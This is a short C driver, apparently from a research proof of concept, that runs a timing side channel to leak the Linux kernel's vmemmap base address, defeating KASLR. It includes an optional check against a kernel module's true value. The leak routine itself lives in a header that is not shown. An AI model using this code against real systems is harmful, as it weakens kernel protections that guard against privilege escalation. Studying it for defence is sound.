#include "coarse_grain_leak.h"
#define VALIDATE
#ifdef VALIDATE
#include "ulkm.h"
#endif

#define TRIES 30

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    init_tlb_flush();
    pin_to_core(0);

    /* warmup */
#ifdef VALIDATE
    size_t vmemmap_base = 0;
    lkm_init();
    lkm_vmemmap_leak((size_t)&vmemmap_base);
#endif

    for (volatile size_t i = 0; i < (1ULL << 30); ++i);
    /* leaking */
    size_t found = 0;
    size_t addr = vmemmap_leak_found(TRIES, &found);
    if (!found) {
        printf("[*] not found -> retry\n");
        return 0;
    }
    printf("%016zx\n", addr);
#ifdef VALIDATE
    if (vmemmap_base == addr)
        printf("[+] success\n");
    else
        printf("[!] fail\n");
#endif
}